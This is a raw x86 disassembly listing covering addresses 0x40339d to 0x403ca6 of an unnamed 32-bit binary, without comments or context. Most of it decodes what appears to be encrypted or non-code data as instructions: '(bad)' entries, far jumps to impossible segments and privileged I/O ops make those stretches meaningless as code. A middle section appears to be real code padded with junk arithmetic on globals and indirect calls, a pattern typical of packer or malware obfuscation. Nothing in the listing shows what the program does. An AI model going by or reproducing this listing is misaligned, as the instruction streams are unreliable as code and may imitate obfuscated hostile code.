  40339d:	sub    BYTE PTR [esi+0x56],cl
  4033a0:	xor    al,0x43
  4033a2:	mov    ecx,?
  4033a4:	jl     0x4033db
  4033a6:	std    
  4033a7:	and    BYTE PTR [ebx-0x2e],ah
  4033aa:	inc    esp
  4033ab:	shr    ecx,1
  4033ad:	adc    BYTE PTR [ebx],cl
  4033af:	xor    bl,BYTE PTR [edx]
  4033b1:	call   0xd555:0x8eadfec0
  4033b8:	test   BYTE PTR [edi+0x35],0x70
  4033bc:	in     eax,0xa7
  4033be:	imul   DWORD PTR es:[ecx-0x7783d9d0]
  4033c5:	aaa    
  4033c6:	leave  
  4033c7:	jmp    0x4e43:0xfe844645
  4033ce:	push   edi
  4033cf:	inc    esi
  4033d0:	sar    esp,1
  4033d2:	pop    ecx
  4033d3:	adc    al,0xb8
  4033d5:	ds jbe 0x403368
  4033d8:	enter  0xd1f0,0xfe
  4033dc:	cmp    eax,0xb4899b6e
  4033e1:	fsubr  DWORD PTR [eax]
  4033e3:	cmp    al,0x59
  4033e5:	jnp    0x403423
  4033e7:	cmp    ecx,DWORD PTR [eax+eiz*1+0x2081892c]
  4033ee:	push   es
  4033ef:	lods   eax,DWORD PTR ds:[esi]
  4033f0:	shr    esi,cl
  4033f2:	arpl   WORD PTR [edx],di
  4033f4:	cmp    al,0x31
  4033f6:	push   ds
  4033f7:	jbe    0x403394
  4033f9:	inc    edi
  4033fa:	dec    eax
  4033fb:	dec    ebx
  4033fc:	retf   
  4033fd:	xchg   esp,eax
  4033fe:	enter  0x8b85,0x88
  403402:	mov    es,WORD PTR [edx]
  403404:	jnp    0x403444
  403406:	cld    
  403407:	or     eax,0xeafeb507
  40340c:	das    
  40340d:	int3   
  40340e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40340f:	jmp    0x4120:0xf92d7ffb
  403416:	mov    al,0x51
  403418:	test   al,bh
  40341a:	scas   al,BYTE PTR es:[edi]
  40341b:	fdiv   QWORD PTR [ebx+0x50]
  40341e:	(bad)  
  40341f:	scas   eax,DWORD PTR es:[edi]
  403420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403421:	jp     0x403476
  403423:	push   esi
  403424:	imul   esi,DWORD PTR [ebx],0x6e91f1de
  40342a:	push   cs
  40342b:	push   esp
  40342c:	xchg   bl,bl
  40342e:	adc    al,0x81
  403430:	or     al,0x20
  403432:	push   esi
  403433:	cmp    dh,BYTE PTR [ecx]
  403435:	inc    edi
  403436:	je     0x403489
  403438:	call   0x8233494c
  40343d:	es pop ebp
  40343f:	xlat   BYTE PTR ds:[ebx]
  403440:	jmp    0xaa9794d
  403445:	shld   DWORD PTR [edi+eax*2-0x4bd3b945],esp,0x99
  40344e:	les    ebp,FWORD PTR [edi-0x42cc4a56]
  403454:	(bad)  [edi-0x4c74552f]
  40345a:	xor    ebx,DWORD PTR [edi-0x45]
  40345d:	out    dx,al
  40345e:	pop    esp
  40345f:	mov    dl,0x90
  403461:	add    DWORD PTR [edx+0x1a],edi
  403464:	cli    
  403465:	dec    ebx
  403466:	jne    0x403482
  403468:	nop
  403469:	in     eax,dx
  40346a:	scas   eax,DWORD PTR es:[edi]
  40346b:	inc    edx
  40346c:	lds    eax,FWORD PTR [eax+0x8214bfc]
  403472:	pop    ss
  403473:	mul    bh
  403475:	loope  0x4034cd
  403477:	das    
  403478:	jle    0x403423
  40347a:	das    
  40347b:	xor    al,0x41
  40347d:	dec    ecx
  40347e:	bound  ebp,QWORD PTR [edx]
  403480:	dec    esp
  403481:	fst    DWORD PTR [eax]
  403483:	loop   0x403435
  403485:	imul   bh
  403487:	(bad)  
  403488:	mov    esp,0x4294b402
  40348d:	mov    esp,ds
  40348f:	mov    WORD PTR ds:0xfa8f2e74,gs
  403495:	inc    ecx
  403496:	stos   DWORD PTR es:[edi],eax
  403497:	ror    DWORD PTR [esp+eiz*8],cl
  40349a:	xor    eax,0x184c0f71
  40349f:	sub    dl,BYTE PTR [edx+eax*2-0xa]
  4034a3:	inc    esp
  4034a4:	aas    
  4034a5:	(bad)  
  4034a6:	sbb    cl,dl
  4034a8:	xor    DWORD PTR [ebx+0x57f519c7],ecx
  4034ae:	or     eax,0x4f58ab50
  4034b3:	pop    edx
  4034b4:	jle    0x4034b5
  4034b6:	jae    0x40349b
  4034b8:	imul   eax,DWORD PTR ds:0x7e0b820d,0xffffffa2
  4034bf:	add    BYTE PTR [ecx+ecx*8+0x24a2e863],dh
  4034c6:	cmc    
  4034c7:	jmp    0x7701cd1e
  4034cc:	aaa    
  4034cd:	sbb    eax,0x344bb234
  4034d2:	mov    dl,0x47
  4034d4:	arpl   WORD PTR [esi+0x79],bp
  4034d7:	sti    
  4034d8:	jae    0x4034bd
  4034da:	xchg   edi,eax
  4034db:	pushf  
  4034dc:	push   esp
  4034dd:	and    BYTE PTR [ecx-0x3d],dh
  4034e0:	jle    0x403555
  4034e2:	or     edi,DWORD PTR [ecx]
  4034e4:	and    DWORD PTR [ebp+eax*1+0x2a],0x1e
  4034e9:	or     BYTE PTR [edx+esi*1+0x76],ah
  4034ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428173,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx-0x7b],ch
  403514:	test   BYTE PTR ds:0x18e5c3be,bh
  40351a:	sbb    BYTE PTR [esi+0x11181812],bl
  403520:	stos   BYTE PTR es:[edi],al
  403521:	sahf   
  403522:	test   dl,0xd7
  403525:	int3   
  403526:	mov    cl,0xa6
  403528:	cdq    
  403529:	aad    0xf4
  40352b:	xor    al,0xd5
  40352d:	dec    ebx
  40352e:	mov    cl,0xc
  403530:	into   
  403531:	sub    DWORD PTR [esi],ebp
  403533:	or     al,0x35
  403535:	mov    ecx,0xc9f6221b
  40353a:	mov    dl,0x79
  40353c:	jmp    0xb52f2125
  403541:	in     al,dx
  403542:	add    BYTE PTR [eax-0x28558e4f],al
  403548:	mov    WORD PTR [ecx+0x16ed03bf],ss
  40354e:	adc    BYTE PTR [ecx],0x41
  403551:	pop    ss
  403552:	push   esi
  403553:	dec    esp
  403554:	inc    ebx
  403555:	mov    ebx,0x1d19a25e
  40355a:	jp     0x403511
  40355c:	and    eax,0xc17ecd94
  403561:	cmp    eax,0x9dcd1fde
  403566:	(bad)  
  403567:	lock lahf 
  403569:	and    DWORD PTR [edi+edx*4-0x6f],esi
  40356d:	sbb    al,0x67
  40356f:	das    
  403570:	call   DWORD PTR [ebx-0x27]
  403573:	mov    ebx,0xe1d44c03
  403579:	sub    eax,0xab086c71
  40357e:	sahf   
  40357f:	call   0x1de1e8b4
  403584:	repz daa 
  403586:	dec    ecx
  403587:	cdq    
  403588:	fcom   st(5)
  40358a:	lods   al,BYTE PTR ds:[esi]
  40358b:	popa   
  40358c:	dec    ebp
  40358d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40358e:	addr16 push edi
  403590:	mov    esi,0x4ac54286
  403595:	cmp    edx,esi
  403597:	retf   0xcd7e
  40359a:	mov    esp,0x8ea6af83
  40359f:	retf   
  4035a0:	arpl   WORD PTR [eax+0x28],bp
  4035a3:	jmp    0xe01d:0xe4cbc51e
  4035aa:	push   ss
  4035ab:	stos   BYTE PTR es:[edi],al
  4035ac:	mov    BYTE PTR [ecx+0x2a6abc1f],al
  4035b2:	ror    BYTE PTR [edx-0x24722e5f],1
  4035b8:	pop    edx
  4035b9:	mov    edx,0x18f78dfd
  4035be:	lds    edx,FWORD PTR [esi-0x18]
  4035c1:	or     esi,DWORD PTR [edi-0x3d44f81c]
  4035c7:	dec    edx
  4035c8:	or     BYTE PTR [edx],ah
  4035ca:	jnp    0x4035e3
  4035cc:	mov    DWORD PTR [esi+0x24],ebp
  4035cf:	mov    eax,0xfb4ad703
  4035d4:	lods   eax,DWORD PTR ds:[esi]
  4035d5:	inc    edx
  4035d6:	adc    al,0x71
  4035d8:	fcomi  st,st(6)
  4035da:	add    edx,ebx
  4035dc:	add    BYTE PTR [esi+0x40a1b5a3],bl
  4035e2:	lock and BYTE PTR [ecx+eiz*1+0x10419a20],al
  4035ea:	pop    es
  4035eb:	xor    DWORD PTR [ebp+0x68],0xf6f40b30
  4035f2:	or     al,0xc2
  4035f4:	scas   al,BYTE PTR es:[edi]
  4035f5:	jle    0x4035d3
  4035f7:	daa    
  4035f8:	add    ah,BYTE PTR [ecx+ecx*4-0x50]
  4035fc:	lock mov cl,0x50
  4035ff:	adc    al,0x4b
  403601:	jo     0x40366b
  403603:	pavgw  mm1,QWORD PTR [eax+0x5a]
  403607:	mov    bh,0x7
  403609:	fimul  DWORD PTR [ecx+0x23]
  40360c:	mov    ch,0xfb
  40360e:	bound  ecx,QWORD PTR [edi+ebp*8+0x7040a94c]
  403615:	jp     0x403645
  403617:	dec    esi
  403618:	jnp    0x403614
  40361a:	jg     0x4035a6
  40361c:	dec    ebx
  40361d:	popa   
  40361e:	dec    ebp
  40361f:	sbb    eax,eax
  403621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403622:	loop   0x40368e
  403624:	jmp    0xb57743d0
  403629:	jbe    0x403621
  40362b:	xor    eax,0xff46d03c
  403630:	sbb    eax,0x3e2be9fb
  403635:	inc    edx
  403636:	not    BYTE PTR [edi-0x25a907f]
  40363c:	fst    DWORD PTR [ebx+0x5a3a2432]
  403642:	or     DWORD PTR [ecx+0x54],edx
  403645:	int3   
  403646:	sub    eax,0x7fe6ca33
  40364b:	add    eax,0x2d111d8
  403650:	outs   dx,BYTE PTR ds:[esi]
  403651:	or     eax,0xeca53b6d
  403656:	push   esp
  403657:	loopne 0x4036b6
  403659:	dec    esp
  40365a:	fdivr  QWORD PTR [ebx-0x64dfee9e]
  403660:	ss xchg edx,eax
  403662:	or     eax,0xa0535365
  403667:	sbb    cl,BYTE PTR [ebp-0x4d]
  40366a:	cmp    al,0x9d
  40366c:	add    cl,cl
  40366e:	fcomi  st,st(6)
  403670:	add    DWORD PTR [ebx+0x62db5ba1],esi
  403676:	sbb    ah,bl
  403678:	hlt    
  403679:	in     eax,dx
  40367a:	xchg   DWORD PTR [edx],ecx
  40367c:	jmp    0x403676
  40367e:	daa    
  40367f:	and    dh,bl
  403681:	inc    esi
  403682:	popa   
  403683:	(bad)  
  403684:	sub    DWORD PTR [esi-0x61],ebp
  403687:	(bad)  [ebx]
  403689:	and    DWORD PTR [ecx+edx*2-0x477f22bf],esp
  403690:	enter  0xd04b,0x88
  403694:	adc    ch,BYTE PTR [esi+0x71]
  403697:	or     eax,0x13a2cc9a
  40369c:	jle    0x4036f8
  40369e:	or     al,0x2e
  4036a0:	mov    ch,0x67
  4036a2:	jne    0x403635
  4036a4:	cmp    BYTE PTR [edi+esi*4+0x1c],0xb3
  4036a9:	pushf  
  4036aa:	loop   0x403681
  4036ac:	dec    esp
  4036ad:	cmp    eax,0x4cf55bd4
  4036b2:	adc    DWORD PTR [ebx+0x138b556b],0xffffffbd
  4036b9:	xchg   ebx,eax
  4036ba:	fadd   st(6),st
  4036bc:	pop    edi
  4036bd:	shl    BYTE PTR [edi-0x4995f224],cl
  4036c3:	(bad)  
  4036c5:	int    0x43
  4036c7:	aam    0x19
  4036c9:	mov    ebp,0x6070cfaa
  4036ce:	ss adc dh,ch
  4036d1:	lock cmp al,0xaa
  4036d4:	jne    0x4036dc
  4036d6:	shl    esp,0x40
  4036d9:	icebp  
  4036da:	jno    0x403718
  4036dc:	ret    
  4036dd:	mov    bl,0xee
  4036df:	std    
  4036e0:	scas   al,BYTE PTR es:[edi]
  4036e1:	(bad)  
  4036e2:	sti    
  4036e3:	pop    eax
  4036e4:	sub    eax,0x61cde55
  4036e9:	sti    
  4036ea:	fnstenv [edi+0x26128922]
  4036f0:	lds    eax,FWORD PTR [esp+ecx*8-0x56f731f1]
  4036f7:	scas   eax,DWORD PTR es:[edi]
  4036f8:	and    bh,ch
  4036fa:	cmp    dl,dh
  4036fc:	in     eax,0xdc
  4036fe:	hlt    
  4036ff:	sar    al,0x95
  403702:	mov    esi,0xa44b566e
  403707:	pop    es
  403708:	in     al,0x3f
  40370a:	fcom   DWORD PTR [eax+eiz*2+0x55]
  40370e:	dec    ecx
  40370f:	mov    edx,0x7c65d527
  403714:	(bad)  
  403715:	cli    
  403716:	cmp    eax,0xcec12d63
  40371b:	iret   
  40371c:	xor    eax,0x13ffc0fb
  403721:	std    
  403722:	cli    
  403723:	sahf   
  403724:	data16 sub al,0x32
  403727:	nop
  403728:	aas    
  403729:	mov    ds,WORD PTR [edx+0x60316fec]
  40372f:	lods   ax,WORD PTR ds:[esi]
  403731:	idiv   BYTE PTR [edi+ebx*1-0x26]
  403735:	ins    BYTE PTR es:[edi],dx
  403736:	stc    
  403737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403738:	mov    bh,0x13
  40373a:	inc    esp
  40373b:	es jl  0x40372a
  40373e:	xchg   ebx,eax
  40373f:	loop   0x4037b3
  403741:	loopne 0x403736
  403743:	cld    
  403744:	stos   DWORD PTR es:[edi],eax
  403745:	pop    edx
  403746:	and    ch,BYTE PTR [edi-0x7]
  403749:	repnz adc eax,0x99107c6e
  40374f:	cmp    eax,0xa44a9374
  403754:	in     al,0x72
  403756:	jb     0x403788
  403758:	sahf   
  403759:	rcr    ah,0x8e
  40375c:	push   ebx
  40375d:	loop   0x4036f0
  40375f:	dec    edx
  403760:	sbb    BYTE PTR [eax-0x2497e4e9],bl
  403766:	(bad)  
  403767:	sub    eax,0xafe265a7
  40376c:	inc    ebp
  40376d:	mov    dl,0x70
  40376f:	jmp    0x1304:0x2aca29b8
  403776:	push   ebp
  403777:	aas    
  403778:	or     eax,DWORD PTR [ecx-0x1057a51]
  40377e:	pop    edx
  40377f:	daa    
  403780:	adc    DWORD PTR [eax+0x18],ecx
  403783:	sub    eax,0x328b6e09
  403788:	push   cs
  403789:	lods   al,BYTE PTR ds:[esi]
  40378a:	test   DWORD PTR [edi+eax*4+0x3ba55017],ecx
  403791:	in     al,0x4a
  403793:	cmp    eax,0xb7693388
  403798:	ror    esi,0xec
  40379b:	sub    DWORD PTR [ecx-0x455bf8de],esi
  4037a1:	fisttp DWORD PTR [edi-0x151078ad]
  4037a7:	leave  
  4037a8:	cs iret 
  4037aa:	jo     0x4037b4
  4037ac:	jecxz  0x4037c4
  4037ae:	in     eax,0x1b
  4037b0:	popf   
  4037b1:	xor    esi,edx
  4037b3:	and    BYTE PTR [edi+0xeab1b34],bl
  4037b9:	or     cl,BYTE PTR [eax+0x3b37c39d]
  4037bf:	adc    ah,BYTE PTR [ecx+0x6ed91d8e]
  4037c5:	or     eax,0x2f2bc645
  4037ca:	test   al,0xd8
  4037cc:	push   DWORD PTR ds:0x279ba4fc
  4037d2:	mov    ebp,0x29f32600
  4037d7:	sbb    al,0xfd
  4037d9:	cmc    
  4037da:	sbb    BYTE PTR [esi],dh
  4037dc:	retf   
  4037dd:	test   dh,cl
  4037df:	scas   al,BYTE PTR es:[edi]
  4037e0:	stc    
  4037e1:	sbb    DWORD PTR [esi-0x70c1b902],esp
  4037e7:	xchg   edx,eax
  4037e8:	push   edx
  4037e9:	mov    ch,0xf6
  4037eb:	and    dh,BYTE PTR [esi]
  4037ed:	mov    DWORD PTR [edx],esi
  4037ef:	cmp    dl,BYTE PTR [eax-0xcf5cff7]
  4037f5:	add    al,0xaa
  4037f7:	(bad)  
  4037f8:	mov    ds,WORD PTR [ebp+0x31]
  4037fb:	(bad)  [ecx-0x47]
  4037fe:	shl    esi,cl
  403800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403801:	jge    0x4037a9
  403803:	dec    esp
  403804:	(bad)  
  403806:	jno    0x4037e7
  403808:	sub    eax,0xef99032f
  40380d:	xor    eax,0xde09cbfd
  403812:	test   al,0x70
  403814:	xor    cl,ah
  403816:	or     bh,ah
  403818:	xor    eax,0xcbf3b7eb
  40381d:	push   ecx
  40381e:	sbb    BYTE PTR [esi+0x154c4b37],ch
  403824:	cld    
  403825:	nop
  403826:	retf   
  403827:	add    esi,0xffffffbd
  40382a:	cmp    eax,0x15763f99
  40382f:	aaa    
  403830:	arpl   WORD PTR [esi+0x1d],ax
  403833:	push   edx
  403834:	test   eax,0xc34e2f62
  403839:	adc    DWORD PTR ds:0xb452e8bc,esi
  40383f:	adc    ebx,DWORD PTR [edx]
  403841:	push   esp
  403842:	data16 cmp bl,BYTE PTR cs:[edx-0x289774ae]
  40384a:	xchg   ecx,eax
  40384b:	pushf  
  40384c:	int3   
  40384d:	mov    ah,0x31
  40384f:	sbb    bl,BYTE PTR [eax+0x2]
  403852:	push   ebp
  403853:	xchg   edx,eax
  403854:	mov    BYTE PTR [edx+edi*2],bh
  403857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403858:	je     0x403864
  40385a:	inc    ebx
  40385b:	mov    edi,0x338a98a2
  403860:	ror    DWORD PTR [esi-0x67],cl
  403863:	adc    al,0x10
  403865:	out    0x79,al
  403867:	cmp    edx,DWORD PTR [esi-0x13de4ac8]
  40386d:	dec    edi
  40386e:	mov    dl,0xcf
  403870:	mov    ebx,ebx
  403872:	out    dx,al
  403873:	push   ds
  403874:	push   eax
  403875:	adc    BYTE PTR [bx+di+0x62c5],dl
  40387a:	add    al,0x76
  40387c:	ror    DWORD PTR [ecx+0x75],0x40
  403880:	fstp   TBYTE PTR [edi]
  403882:	xchg   ebx,eax
  403883:	add    bl,BYTE PTR [esi-0x3550311d]
  403889:	fneni(8087 only) 
  40388b:	mov    dl,0xdc
  40388d:	push   eax
  40388e:	and    DWORD PTR [esi],0x94144536
  403894:	dec    esi
  403895:	mov    ah,0xc7
  403897:	cdq    
  403898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403899:	dec    ebp
  40389a:	lock mov BYTE PTR [edi+0x72708f5a],ah
  4038a1:	jno    0x403849
  4038a3:	mov    ah,0x2c
  4038a5:	je     0x403905
  4038a7:	test   BYTE PTR [edi+eiz*4],bh
  4038aa:	rcl    BYTE PTR ds:0x57f8180,1
  4038b0:	sbb    edi,DWORD PTR [ecx+eax*1]
  4038b3:	test   edi,edi
  4038b5:	mov    dl,0x2b
  4038b7:	add    ecx,ebx
  4038b9:	sar    DWORD PTR [ecx],0x8
  4038bc:	mov    bl,ah
  4038be:	inc    edi
  4038bf:	ins    DWORD PTR es:[edi],dx
  4038c0:	popf   
  4038c1:	mov    bh,0xcd
  4038c3:	pop    ecx
  4038c4:	leave  
  4038c5:	aaa    
  4038c6:	mov    al,0x26
  4038c8:	sti    
  4038c9:	pop    ss
  4038ca:	dec    eax
  4038cb:	and    eax,0x2de956cb
  4038d0:	dec    esi
  4038d1:	and    BYTE PTR [eax],cl
  4038d3:	jle    0x403933
  4038d5:	in     eax,dx
  4038d6:	call   0x4187db87
  4038db:	add    ah,bh
  4038dd:	mov    edx,0x458b96d9
  4038e2:	hlt    
  4038e3:	cmp    DWORD PTR ds:0x428273,0x0
  4038ea:	not    DWORD PTR ds:0x42816b
  4038f0:	mov    ecx,DWORD PTR ds:0x428297
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428273,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428ee8
  403913:	xor    edx,DWORD PTR ds:0x42825f
  403919:	neg    DWORD PTR ds:0x428273
  40391f:	xor    DWORD PTR ds:0x428167,0x12a5
  403929:	and    DWORD PTR ds:0x4283b7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42829b
  403939:	or     ecx,DWORD PTR ds:0x42824f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428173,0x0
  403949:	mov    DWORD PTR ds:0x4283b7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428173,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dbc
  40397f:	adc    DWORD PTR ds:0x4282a7,0x42818f
  403989:	sbb    DWORD PTR ds:0x428293,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428393
  403999:	or     DWORD PTR ds:0x42826f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428297
  4039a7:	adc    edx,DWORD PTR ds:0x42827b
  4039ad:	mov    DWORD PTR ds:0x428297,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42824f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282b7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x4282ab,0x4283b7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42818b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428167,0x42832f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428173,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42816b,0x428303
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42827f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428297,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428167,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428293,0x0
  403a3e:	mov    DWORD PTR ds:0x42831f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283b7
  403a57:	cmp    DWORD PTR ds:0x428293,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d98
  403a6f:	mov    edx,DWORD PTR ds:0x42834f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283e3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428193,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428187,0x2089
  403aa2:	or     DWORD PTR ds:0x42816b,0x113b
  403aac:	mov    eax,ds:0x4223e0
  403ab1:	cmp    DWORD PTR ds:0x428193,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42825f
  403ac3:	mov    DWORD PTR ds:0x428243,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428333,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428193,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428193,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428133
  403af8:	call   DWORD PTR ds:0x428dc0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42825b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42829f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42838b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42817b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x7c874d01
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi-0x21e7e7ee],bl
  403b4b:	adc    bl,dl
  403b4d:	(bad)  
  403b4f:	in     eax,0xfb
  403b51:	test   eax,0xfd7f50b0
  403b56:	ins    DWORD PTR es:[edi],dx
  403b57:	repnz cmp BYTE PTR [ebp+0x62],bl
  403b5b:	pop    edi
  403b5c:	int    0x60
  403b5e:	mov    ebp,0x7629a8d3
  403b63:	mov    DWORD PTR [edx+edi*8+0x7d2db29],esi
  403b6a:	adc    BYTE PTR [ebx],ch
  403b6c:	rcl    esi,cl
  403b6e:	int3   
  403b6f:	push   es
  403b70:	not    BYTE PTR [edx-0x2d34b2f3]
  403b76:	loope  0x403b49
  403b78:	cli    
  403b79:	adc    esp,DWORD PTR [ecx+edx*8-0x7dc4c165]
  403b80:	push   esi
  403b81:	sub    al,0xc
  403b83:	cld    
  403b84:	xor    al,0xd5
  403b86:	and    ch,cl
  403b88:	jnp    0x403b79
  403b8a:	inc    ecx
  403b8b:	pop    esi
  403b8c:	scas   al,BYTE PTR es:[edi]
  403b8d:	inc    ebx
  403b8e:	push   ebp
  403b8f:	int3   
  403b90:	xor    al,0x8e
  403b92:	pop    edi
  403b93:	data16 and dh,BYTE PTR [ebx]
  403b96:	xor    DWORD PTR [ebx],esi
  403b98:	sbb    al,0x6
  403b9a:	cmc    
  403b9b:	cmp    BYTE PTR [ebp-0x2b],0xad
  403b9f:	adc    al,0x41
  403ba1:	jmp    0x403bbe
  403ba3:	or     al,0x5f
  403ba5:	lods   al,BYTE PTR ds:[esi]
  403ba6:	fldcw  WORD PTR [edx+edi*4]
  403ba9:	mov    ds:0x47c2220d,al
  403bae:	jmp    0x375521f1
  403bb3:	xchg   dl,ch
  403bb5:	push   edi
  403bb6:	pop    edx
  403bb7:	push   ss
  403bb8:	mov    esi,0xea95f876
  403bbd:	(bad)  
  403bbe:	lea    esp,gs:[edx*8+0x729e4073]
  403bc6:	imul   ebx,DWORD PTR [esi+0x2b864750],0x7a9f66a6
  403bd0:	sahf   
  403bd1:	inc    edi
  403bd2:	into   
  403bd3:	and    DWORD PTR [esi+0x2f],0xffffff93
  403bd7:	dec    eax
  403bd8:	xor    DWORD PTR [eax-0x3d2004e],edi
  403bde:	das    
  403bdf:	mov    dl,BYTE PTR [edi+0x4b]
  403be2:	into   
  403be3:	or     cl,dh
  403be5:	dec    edx
  403be6:	push   eax
  403be7:	ficomp DWORD PTR [ebx+0x661f1a18]
  403bed:	add    BYTE PTR [ebx+ebp*8],ch
  403bf0:	xchg   edx,eax
  403bf1:	and    dl,BYTE PTR [edi+0x67cac7c0]
  403bf7:	adc    eax,0xb7da9f8c
  403bfc:	aam    0xef
  403bfe:	and    edx,ebp
  403c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c01:	outs   dx,DWORD PTR ds:[esi]
  403c02:	loop   0x403bdc
  403c04:	out    dx,al
  403c05:	sbb    al,BYTE PTR ds:[ecx]
  403c08:	jg     0x403bc3
  403c0a:	inc    eax
  403c0b:	in     al,0xb
  403c0d:	fptan  
  403c0f:	jmp    0xcb951b74
  403c14:	dec    ecx
  403c15:	loope  0x403c54
  403c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c18:	aad    0x2a
  403c1a:	pop    es
  403c1b:	inc    esi
  403c1c:	cmc    
  403c1d:	inc    ecx
  403c1e:	adc    BYTE PTR [ecx+0x244825b7],dh
  403c24:	jmp    0x60e686c2
  403c29:	push   edi
  403c2a:	(bad)  
  403c2b:	mov    bh,0xb8
  403c2d:	ret    0xe449
  403c30:	adc    al,0x74
  403c32:	cmp    BYTE PTR ds:0x85d19bcf,dh
  403c38:	push   esp
  403c39:	mov    ebp,0x49b499a4
  403c3e:	adc    ebp,DWORD PTR [edi-0x190a43d0]
  403c44:	(bad)  
  403c45:	pushf  
  403c46:	inc    ebp
  403c47:	pushf  
  403c48:	pop    es
  403c49:	mov    dh,0xb4
  403c4b:	in     eax,dx
  403c4c:	and    eax,0xddab9bf6
  403c51:	stos   BYTE PTR es:[edi],al
  403c52:	jl     0x403cb6
  403c54:	sbb    al,0x9d
  403c56:	pop    ebx
  403c57:	in     eax,dx
  403c58:	jmp    0x5f4557f1
  403c5d:	push   edi
  403c5e:	(bad)  
  403c5f:	fs cmp al,cl
  403c62:	shr    DWORD PTR [esp+eiz*4],0x9b
  403c66:	adc    eax,0x3cc9649b
  403c6b:	test   edi,ecx
  403c6d:	pop    esp
  403c6e:	in     al,0x24
  403c70:	scas   al,BYTE PTR es:[edi]
  403c71:	sub    ecx,edx
  403c73:	and    ecx,DWORD PTR [edx-0x7f23f0b7]
  403c79:	fcom   QWORD PTR [edx]
  403c7b:	xchg   edi,eax
  403c7c:	jg     0x403c6e
  403c7e:	jbe    0x403cc5
  403c80:	iret   
  403c81:	xchg   DWORD PTR [eax],esi
  403c83:	xor    dl,BYTE PTR [ebp-0x1af05cc9]
  403c89:	fild   QWORD PTR [eax+0x74]
  403c8c:	int    0x9b
  403c8e:	sbb    esp,DWORD PTR [eax+edi*2+0x1588489b]
  403c95:	adc    eax,0xd59bbca5
  403c9a:	pop    edi
  403c9b:	xchg   esi,eax
  403c9c:	and    DWORD PTR [eax-0x2be8482e],ebx
  403ca2:	xchg   edx,eax
  403ca3:	xchg   esi,eax
  403ca4:	int3   
  403ca5:	outs   dx,BYTE PTR ds:[esi]
  403ca6:	mov    ecx,0x22498e04
